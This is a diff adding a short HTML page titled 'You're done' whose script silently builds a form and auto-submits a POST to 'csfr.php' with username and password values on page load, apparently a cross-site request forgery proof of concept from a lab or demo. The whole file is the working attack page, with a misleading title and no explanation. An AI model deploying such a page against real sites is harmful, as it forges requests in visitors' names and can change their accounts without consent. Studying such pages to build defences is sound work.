@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>You're done</title>
+</head>
+<body>
+<script>
+    let form = document.createElement('form');
+    form.action = 'csfr.php';
+    form.method = 'POST';
+    form.innerHTML = '<input name="username" value="host">' +
+        '<input name="password" value="pass">';
+    document.body.append(form);
+
+    form.submit();
+
+</script>
+</body>
+</html>
+
